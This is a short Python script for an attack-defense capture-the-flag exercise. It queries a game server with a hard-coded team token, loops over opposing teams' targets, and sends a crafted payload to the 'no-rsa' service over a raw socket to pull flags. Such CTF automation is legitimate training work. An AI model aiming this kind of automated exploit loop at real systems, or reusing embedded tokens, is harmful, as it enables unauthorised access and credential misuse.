from swpag_client import Team
import json
import socket

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    while 1:
        data = s.recv(1024)
        if data == "":
            break
        print "Received:", repr(data)
    print "Connection closed."
    s.close()

def exploit_no_rsa(hostname, port, flagId):
    print 'hostname:',hostname, 'port:',port, 'flagId:', flag_id
    content = 'S'+ "\n" + '0' + flag_id
    netcat(hostname, port, content)

t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
print(t.game_url)
#print(t.get_vm())
print(t.get_game_status())
print(t.get_service_list())
#t.get_targets(service_id)
services = t.get_service_list()
print('services:',services)
print()
print()
for service in services:
    print 'SERVICE NAME:',service
    print 'SERVICE ID:',service['service_id']
    service_id = service['service_id']
    service_name = service['service_name']
    print 'service_name:',service_name
    targets = t.get_targets(service_id)
    for target in targets:
        print('TARGET NAME:',target)#,netcat(target,''))
        hostname = target['hostname']
        port = target['port']
        flag_id = target['flag_id']
        if service_name == 'no-rsa':
            exploit_no_rsa(hostname,port,flag_id)
